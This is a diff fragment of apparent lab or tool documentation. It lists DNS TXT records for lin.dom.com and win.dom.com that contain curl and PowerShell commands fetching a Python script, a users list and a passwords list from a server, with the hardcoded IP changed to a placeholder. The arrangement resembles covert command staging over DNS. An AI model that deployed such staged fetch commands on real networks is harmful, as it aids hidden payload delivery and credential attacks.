@@ -11,13 +11,13 @@
 --> 2 Domains with TXT entries:
 
 -> lin.dom.com:
-lin_1: curl -s 'http://192.168.10.25/get_own_ip.py'
-lin_2: curl -s 'http://192.168.10.25/users.txt'
-lin_3: curl -s 'http://192.168.10.25/pass.txt'
+lin_1: curl -s 'http://<server>/get_own_ip.py'
+lin_2: curl -s 'http://<server>/users.txt'
+lin_3: curl -s 'http://<server>/pass.txt'
 -> win.dom.com:
-win_1: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/get_own_ip.py').Content
-win_2: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/users.txt').Content
-win_3: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/pass.txt').Content
+win_1: powershell (Invoke-WebRequest -Uri 'http://<server>/get_own_ip.py').Content
+win_2: powershell (Invoke-WebRequest -Uri 'http://<server>/users.txt').Content
+win_3: powershell (Invoke-WebRequest -Uri 'http://<server>/pass.txt').Content
 
 -> Server (hosting get_own_ip.py, user.txt, pass.txt):
 
